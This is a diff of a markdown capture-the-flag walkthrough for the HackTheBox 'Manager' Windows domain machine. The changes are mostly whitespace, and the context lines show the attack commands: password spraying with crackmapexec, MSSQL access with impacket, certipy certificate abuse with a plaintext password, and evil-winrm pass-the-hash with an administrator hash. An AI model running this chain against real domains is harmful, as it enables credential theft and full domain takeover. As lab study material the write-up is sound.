@@ -36,16 +36,19 @@ impacket-GetNPUsers manager.htb/ -users validusers.txt -no-pass -dc-ip manager.h
 - No ASRepRoasting to be done
 
 - Not able to login with usernames and no password:
+  
 ```bash
 enum4linux -u "guest" -a manager.htb
 
 ```
 - Extract the usernames:
+  
 ```bash
 cat validusers.txt | cut -d '@' -f1 > usernames.txt
 
 ```
 - Got a using the usernames as passwords:
+  
 ```bash
 crackmapexec smb manager.htb -u usernames.txt -p usernames.txt --no-brute --continue-on-success
 
@@ -60,6 +63,7 @@ crackmapexec smb manager.htb -u usernames.txt -p usernames.txt --no-brute --cont
 - We do have port 1433 open - MSSQL:
 
 - Using Windows' own **sqlcmd** - it doesn't work:
+  
 ```bash
 sqlcmd -S manager.htb,1433 -U operator -P operator -C
 
@@ -68,6 +72,7 @@ sqlcmd -S manager.htb,1433 -U operator -P operator -C
 ![image5](../resources/5d76c8f76d954958b795a9e18ec48cd5.png)
 
 - But using impacket's tool mssqlclient:
+  
 ```bash
 impacket-mssqlclient -p 1433 manager/operator:operator@manager.htb -windows-auth
 
@@ -83,6 +88,7 @@ It authenticates using Windows authentication, which could suggest that the 'ope
 
 
 ![image7](../resources/2f7494eef5664d589dd45345cb972db0.png)
+
 ```sql
 SELECT @@VERSION -- to get the SQL Server version,
 SELECT SYSTEM_USER -- to identify the current user,
@@ -114,7 +120,7 @@ But hashcat got exhausted
 
 ![image12](../resources/4d8818100ffc4512a8d55ed9ae323f53.png)
 
-- The default IIS webserver directory is:
+- The default IIS webserver directory is:  
 **C:\inetpub\wwwroot**
 
 
@@ -123,6 +129,7 @@ But hashcat got exhausted
 Here we can see a .zip file
 
 - Using wget we can download the file:
+  
 ```bash
 wget http://manager.htb/website-backup-27-07-23-old.zip
 
@@ -151,6 +158,7 @@ cat user.txt
 
 ```
 - Check VMWare version:
+  
 ```powershell
 $vmwareToolsDir = "C:\Program Files\VMware\VMware Tools"
 $vmwareToolsVersion = (Get-Item "$vmwareToolsDir\vmtoolsd.exe").VersionInfo.FileVersion
@@ -234,6 +242,7 @@ certipy req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca '
 - Now we have a **.pfx certificate** as the administrator
 
 - Authenticate as the administrator:
+  
 ```bash
 certipy auth -pfx administrator.pfx -dc-ip 10.129.218.140
 
@@ -244,6 +253,7 @@ certipy auth -pfx administrator.pfx -dc-ip 10.129.218.140
 We get a NTP error because the time difference between my Kali machine and the DC is too big
 
 - To synchronise the time, run:
+  
 ```bash
 sudo ntpdate -u manager.htb
 
@@ -258,6 +268,7 @@ These two steps, between the ntp sync and auth, needs to be quick
 ![image28](../resources/2d29121dc61448e18c2aeeb3ab32c5d1.png)
 
 - Using the hash and evil-winrm:
+  
 ```bash
 evil-winrm -i manager.htb -u administrator -H ae5064c2f62317332c88629e025924ef
 
